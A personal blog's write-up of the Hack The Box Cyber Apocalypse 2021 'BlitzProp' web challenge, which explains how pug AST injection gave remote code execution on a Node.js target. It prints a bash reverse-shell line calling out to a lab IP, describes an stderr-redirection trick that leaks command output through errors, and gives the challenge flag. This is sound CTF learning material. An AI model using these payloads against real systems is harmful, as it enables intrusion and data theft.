## Welcome to my blog

Hello 👋 My name is Adam, I'm a Software Engineer in the Computer & Network Security space.

I love to solve difficult problems with code. I also get a kick out of writing software that is clean and performant.

This blog is just a place for me to post my thoughts/experiences on various Software related topics.

You can contact me at: adammcclenaghan@protonmail.com

<details><summary>Public PGP key</summary>
-----BEGIN PGP PUBLIC KEY BLOCK-----

Version: OpenPGP.js v4.10.8

Comment: https://openpgpjs.org

xsBNBGB3Pf4BCACx7MVDmI0aa5VP7aN8fcQRIKd5+a9rjkl5WO5FswGvT4sk
v28R6pBSKLeOpF8Gp4oZeteLsQs00Ad28AYDm0YKsq5vs5gdGxsA9PnP5Ecn
jwtRh3VKYjh9htP4DyVDSMlmvAcXnskxbSt1BYX1dH9b9eFtzuu7oSS+GpLh
hNzbKbXsUzuME5k9q0B3Ce1b5C720JZtOM8YguXsU5xqmAIBhITtV1ZyGPwE
/O0EO0xZKYpMbP2rENqb3jjhRHmKJKdtMjTKQ/15EBfiO224e3SfgkaHUGPQ
AXyic38a+iNu53kXX0YbcRWNrCPBS9ep1MnUZK7eO6/uB4SB+UmFpA9rABEB
AAHNP2FkYW1tY2NsZW5hZ2hhbkBwcm90b25tYWlsLmNvbSA8YWRhbW1jY2xl
bmFnaGFuQHByb3Rvbm1haWwuY29tPsLApwQTAQgAOgUCYHc9/gkQY9bLEN8k
oScWIQRWmGudGlqww12SwTVj1ssQ3yShJwIbAwIeAQIZAQMLCQcCFQgCIgEA
IQkQY9bLEN8koScWIQRWmGudGlqww12SwTVj1ssQ3yShJ0E4CAClRijI5ram
IWrvCb7HqU6GIgfJwOabPbUr6bee5kmDHoClYAYikziQGOV5XZwyghbXlo2m
m1JrFJUU5yHAs5b4hONDAS0jd8Hf9FEV/wWHIrRRbLY/X0kz0IqgcsuV8emL
yW4U/z7UfDMqKhvR9YQ+aI4WBZs3f9ayeOZe0DGu49ZC/cNQEqkhbzxs2cB4
rpx/Km1afhsTZXvXvBn425VybvBqSdJwlEjzMnq3KbhxEiy47V2JogFUPj8s
aw/JUa5QKkE7cs+6uKGdupjsVO42FFoGbxNwcAtVraPGJEy90xoj1bFkW9dq
DhrsZ7RW+PJf8TAz/uNpPC5/OZqdgov9zsBNBGB3Pf4BCADF28zFAk3bghob
KWe+0aEqtukDEQA3aAuDKdWK2x+5UdHhIzNohalnnFxEsENUzGNLr3XFfJiF
DXU34GkXa6juhKRxR4Gss4pA6ffvdCsgtftx3mk5vhLcToQbKWmy8IOM1J6F
P9A/gIV1b5D2E69f4ndHNrKI1o5I0ed5LVdsBh6k4YJYYYOIcs+973+TOdmE
ZBczraQIz0xScy51Gxq5lRa96BggwI3NIFO5t75vjYAA25Hqst9F2bv+Te1s
Izb0B/0eB53/EkxDD00bttez6DGDl8XGuG8bthz/Tl44jYnePxIvgbYlszED
gfuwIVKofBL4An5plV5BnUkPhZJTABEBAAHCwJcEGAEIACoFAmB3Pf4JEGPW
yxDfJKEnFiEEVphrnRpasMNdksE1Y9bLEN8koScCGwwAIQkQY9bLEN8koScW
IQRWmGudGlqww12SwTVj1ssQ3yShJ00TCACJJchSOHeg0TdV8w+z4wr1AoDs
mHuBe21MVpxCRT6m82SQ+CTk6GXZdsMm8Az6nbF9rTGZ8DNd0kEL9FWJ2FB2
s1C/+9pQ7u5jASBKin5fIo83/NnC4jwdrjvCtQhVSuNQPgSVURi66PSEhH/b
uHeWLX5H5oC4Xxd6hQPw4y30YHNClCVSa6P/aYohY6WH8trjxovNOuAIYzp/
WDrglC4XEo1pj4Ixxexfnh7BNSjUkv4MCj7GqlXCtfn8xGLMAUeh8M4y6gQe
lK/KAItsMA74ouY+NMhwv4f2AAws+TdCIL7dSG10yAg6llSNM5LUMRHdgKeN
aZQs97QqbZ7S0+bf
=pPjV

-----END PGP PUBLIC KEY BLOCK-----

</details>


# Hack The Box - Cyber Apocalypse 2021 - BlitzProp Writeup

From 19th April 2021 - 23rd April 2021 [Hack The Box](https://www.hackthebox.eu/) ran their "Cyber Apocalypse" CTF. 

The event was a lot of fun! It ran from Monday - Friday but I managed to get a few hours in each night after work.

I thought I'd do a little write up for one of the challanges, BlitzProp, as the solution I stumbled upon seemed interesting. I'm not sure if this is the intended way to solve the challenge, at the time of writing this the CTF is still ongoing, so I am looking forward to reading writeups from others who solve this challenge.

## Challenge Overview

This challenge was titled BlitzProp.

Like all other challenges in the Web category, we are provided with a dockerized target which can be spun up on demand. For this challenge, we are also given some source code to download.

## Analysis & Solution

To begin with I opened the website just to get a visual idea of what I've got to work with:

![image](https://user-images.githubusercontent.com/21271178/115796185-4a958900-a3c9-11eb-89c4-a0066ad92dce.png)

The page is pretty basic. There is one area to input text along with a "Submit" button.

There are four song titles we can enter. Entering one of these causes the text at the bottom to show `Hello guest, thank you for letting us know!`

![image](https://user-images.githubusercontent.com/21271178/115796431-b841b500-a3c9-11eb-8097-b7f3bf3c3a2e.png)

Inputting invalid text results in the text at the bottom showing `Please provide us with the name of an existing song`

![image](https://user-images.githubusercontent.com/21271178/115796369-aeb84d00-a3c9-11eb-9496-3affdf89c4f2.png)

Ok, so at this point it's time to take a look at the source code. My first step is usually to `tree` the source folder to get an overview of what we have to work with:

![image](https://user-images.githubusercontent.com/21271178/115796575-f8089c80-a3c9-11eb-8060-4d74c40d68a8.png)

Lets look at the `entrypoint.sh` file to try to gather some information about how the docker instance is created:

![image](https://user-images.githubusercontent.com/21271178/115796774-52a1f880-a3ca-11eb-8077-b552690ed381.png)

From this we can see that the flag for this challenge lives under `/app/flag` with some random alphanumeric characters at the end. Good to know.

Next, lets look at the `Dockerfile`. This reveals that the site is running a node-js application.

![image](https://user-images.githubusercontent.com/21271178/115796967-b4faf900-a3ca-11eb-8bfc-bdaeb4d31e2c.png)

Next, lets look at the `index.js` file

![image](https://user-images.githubusercontent.com/21271178/115797162-289d0600-a3cb-11eb-81c9-aaf6a437b47e.png)

From this we can gather that when the submit button is pressed, a `POST` call is made to the `/api/submit` endpoint. 

The function for this endpoint checks if the song we passed in the request body matches one of the expected song names. A different response is generated dependant on whether or not the request we pass includes one of the expected song names.

At this point a few things stand out:
- The song names are being compared against the request body using an `includes` call. This means we have some freedom in what we pass to the endpoint, so long as we include one of the song names somewhere in the request.
- There are only two possible responses. The only variable part is in the successful response, which has the `#{user}` variable.
- The response is generated using via a `pug.compile` call

So at this point, my thoughts were, "How do I inject a value for the `user` variable here? Can I inject a command such as `ls /app/flag*` and get the application to execute the command and return the output to me as part of the response? What does `pug.compile` do?"

So I started doing some research on Google. I am still a beginner when it comes to Web Application exploitation, but I've been gradually learning thanks to Hack The Box.

While looking into the `pug` module I stumbled across a very interesting article on gaining Remote Code Execution (RCE) using Abstract Syntax Tree (AST) injection: https://blog.p6.is/AST-Injection/

What really stood out was the section on the `pug` module: https://blog.p6.is/AST-Injection/#Pug

The author provides a python script which sends a `POST` request to a vulnerable endpoint. This request causes the vulnerable endpoint to execute some code, providing us with a shell.

I wasn't 100% sure if this exploit would work against the endpoint, but it only takes a minute to try it out so I figured it was worth a shot!

So, after running the script against the endpoint, I entered a valid song and pressed 'Submit'. This time, I get a status 500 Response
![image](https://user-images.githubusercontent.com/21271178/115799865-44a3a600-a3d1-11eb-9768-f49f66fe6d2d.png)

But what's really interesting is what we get back as the response!

![image](https://user-images.githubusercontent.com/21271178/115799996-8df3f580-a3d1-11eb-9a5f-17482e300765.png)

```
Error: Command failed: bash -c 'bash -i >& /dev/tcp/10.10.14.205/3333 0>&1'
/bin/sh: bash: not found
 on line 1
    at checkExecSyncError (node:child_process:707:11)
    at Object.execSync (node:child_process:744:15)
    at eval (eval at wrap (/app/node_modules/pug-runtime/wrap.js:6:10), <anonymous>:13:63)
    at template (eval at wrap (/app/node_modules/pug-runtime/wrap.js:6:10), <anonymous>:17:7)
    at /app/routes/index.js:16:81
    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)
    at next (/app/node_modules/express/lib/router/route.js:137:13)
    at Route.dispatch (/app/node_modules/express/lib/router/route.js:112:3)
    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)
    at /app/node_modules/express/lib/router/index.js:281:22
```

So at this point I know that I've got RCE on this target! Now, what happens if I change the script so that `execSync` runs `ls /app/flag*`?

![image](https://user-images.githubusercontent.com/21271178/115800253-25f1df00-a3d2-11eb-8334-389d4edf58de.png)

We get back a 200 response with `Hello guestndefine, thank you for letting us know!`

Ok so it looks a little messed up, but we're not getting the output from the `ls /app/flag*` command in the response unfortunately.

So at this point I took some time to think, there's really only two things to consider now:
1. We are able to perform RCE on the target
2. We can only get output if the command fails

After some thought I realised that, while we are restricted by the fact that we can only get output if the command fails, there is a way we can work around this. We need to do two things to achieve this:
1. Redirect our command's output to STDERR
2. Force the bash command to return a non zero exit code, so that the caller thinks the command failed

This can be done really easily in bash. If we modify the command so that it is `ls /app/flag* 1>&2 && exit 1` then we can redirect the output of `ls /app/flag*` to STDERR (achieved by the `1>&2` part) and have the command return an exit code of 1 (achieved by the `exit 1` part). This should now mean that the `execSync` call will interpret the command as failing, and the `checkExecSyncError` error handling should return the STDERR output to us!

![image](https://user-images.githubusercontent.com/21271178/115800759-2d65b800-a3d3-11eb-91a6-a5c33bd1f330.png)


Perfect! The output is pretty large due to the number of files in the app directory, but here's a truncated example:
```
Error: Command failed: ls /app/* 1>&2 && exit 1
/app/flagz8aiD
... truncated
css
images
js

/app/views:
index.html
 on line 1
    at checkExecSyncError (node:child_process:707:11)
    at Object.execSync (node:child_process:744:15)
    at eval (eval at wrap (/app/node_modules/pug-runtime/wrap.js:6:10), <anonymous>:13:63)
    at template (eval at wrap (/app/node_modules/pug-runtime/wrap.js:6:10), <anonymous>:17:7)
    at /app/routes/index.js:16:81
    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)
    at next (/app/node_modules/express/lib/router/route.js:137:13)
    at Route.dispatch (/app/node_modules/express/lib/router/route.js:112:3)
    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)
    at /app/node_modules/express/lib/router/index.js:281:22
```

Well, now we have the file for the flag `/app/flagz8aiD`, all we have to do is get its contents! We can do that easily using `cat /app/flagz8aiD 1>&2 && exit 1`

![image](https://user-images.githubusercontent.com/21271178/115801001-a2d18880-a3d3-11eb-8f1f-0587f945d104.png)

And there we have it, the flag is `CHTB{p0llute_with_styl3}`

```
Error: Command failed: cat /app/flagz8aiD 1>&2 && exit 1
CHTB{p0llute_with_styl3} on line 1
    at checkExecSyncError (node:child_process:707:11)
    at Object.execSync (node:child_process:744:15)
    at eval (eval at wrap (/app/node_modules/pug-runtime/wrap.js:6:10), <anonymous>:13:63)
    at template (eval at wrap (/app/node_modules/pug-runtime/wrap.js:6:10), <anonymous>:17:7)
    at /app/routes/index.js:16:81
    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)
    at next (/app/node_modules/express/lib/router/route.js:137:13)
    at Route.dispatch (/app/node_modules/express/lib/router/route.js:112:3)
    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)
    at /app/node_modules/express/lib/router/index.js:281:22
```

This was a really fun challenge. The folks at Hack The Box have done a fantastic job with the CTF, I'm looking forward to doing more in the future!
